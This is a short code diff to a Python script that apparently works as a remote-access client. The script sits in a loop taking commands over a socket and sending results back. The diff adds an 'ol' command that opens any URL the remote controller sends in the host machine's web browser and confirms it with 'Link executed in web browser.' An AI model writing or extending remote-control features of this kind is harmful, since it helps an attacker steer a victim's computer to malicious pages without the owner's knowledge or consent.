@@ -4,6 +4,7 @@ import ast
 import ctypes
 import re
 import json
+import webbrowser
 from dotenv import load_dotenv
 from urllib.request import Request, urlopen
 
@@ -144,6 +145,13 @@ while True:
             else:
                 end = str(['rtf', "Invalid path provided."])
                 
+            end = end.encode()
+            s.send(end)
+            
+        if incoming_message[0] == "ol":
+            webbrowser.open(incoming_message[1])
+            
+            end = str(['ol', "Link executed in web browser."])
             end = end.encode()
             s.send(end)
             
